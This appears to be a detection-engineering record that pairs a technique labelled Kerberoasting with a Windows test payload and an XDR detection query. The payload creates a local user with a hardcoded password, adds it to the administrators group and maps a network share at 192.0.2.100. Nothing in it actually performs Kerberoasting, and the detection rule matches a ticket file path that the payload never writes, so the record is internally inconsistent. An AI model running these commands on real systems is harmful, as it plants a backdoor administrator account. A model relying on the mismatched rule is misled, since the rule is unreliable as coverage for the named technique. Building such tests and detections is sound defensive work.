techniques.name: Steal or Forge Kerberos Tickets: Kerberoasting

payload.code:
cmd /c "set KERBEROS_TGT=\"C:\\temp\\ticket.kirbi\" && 
whoami /fqdn && 
set /p TGT_RESPONSE=\"Enter TGT response\" && 
net user /add testuser P@ssw0rd123 && 
net localgroup administrators testuser /add && 
net use \\192.0.2.100\testshare /user:testuser P@ssw0rd123 && 
exit"

biocs.name: Weakly-Encrypted Kerberos TGT Process
biocs.description: Detection of process starting with weakly-encrypted Kerberos ticket handling
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'cmd.exe' and action_process_image_name = 'cmd.exe'
| filter action_file_path contains 'ticket.kirbi'
